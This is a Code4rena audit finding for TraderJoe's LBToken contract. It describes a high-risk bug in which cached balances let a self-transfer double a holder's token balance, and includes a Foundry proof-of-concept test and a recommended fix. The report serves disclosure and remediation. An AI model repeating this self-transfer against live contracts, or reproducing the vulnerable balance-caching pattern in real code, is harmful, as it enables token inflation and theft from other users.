## Tags

- bug
- 3 (High Risk)
- primary issue
- sponsor confirmed
- selected for report
- H-01

# [Transfering funds to yourself increases your balance](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299) 

# Lines of code

https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182
https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187
https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192


# Vulnerability details

## Impact
Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:

```solidity
File: LBToken.sol
176:     function _transfer(
177:         address _from,
178:         address _to,
179:         uint256 _id,
180:         uint256 _amount
181:     ) internal virtual {
182:         uint256 _fromBalance = _balances[_id][_from];
...
187:         uint256 _toBalance = _balances[_id][_to];
188: 
189:         unchecked {
190:             _balances[_id][_from] = _fromBalance - _amount;
191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt
192:         }
..
196:     }
```

Furthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :

```solidity
File: LBToken.sol
32:     modifier checkApproval(address _from, address _spender) {
33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender);
34:         _;
35:     }
...
131:     function safeTransferFrom(
...
136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) {
...
269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) {
270:         return _owner == _spender || _spenderApprovals[_owner][_spender];
271:     }
```

## Proof of Concept
Add the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):

```solidity
    function testSafeTransferFromOneself() public {
        uint256 amountIn = 1e18;

        (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);

        uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);

        assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding

        pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself
        uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance
        assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one
        assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding
    }
```

As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.

## Recommended Mitigation Steps
- Add checks to make sure that `_from != _to` because that shouldn't be useful anyway
- Prefer the following:

```solidity
File: LBToken.sol
189:         unchecked {
190:             _balances[_id][_from] -= _amount;
191:             _balances[_id][_to] += _amount;
192:         }
```